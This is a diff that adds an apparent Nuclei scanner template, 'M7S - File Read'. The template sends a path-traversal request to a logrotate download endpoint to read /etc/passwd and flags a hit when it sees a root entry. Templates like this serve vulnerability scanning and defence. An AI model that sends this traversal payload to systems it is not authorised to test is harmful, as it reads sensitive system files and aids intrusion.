@@ -1,0 +1,22 @@
+id: m7s-fileread
+
+info:
+  name: M7S - File Read
+  author: qwtd
+  severity: high
+  tags: M7S
+
+
+http:
+  - method: GET
+    path:
+      - "{{RootURL}}/api/logrotate/download?file=../../../../../../../etc/passwd"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status:
+          - 200
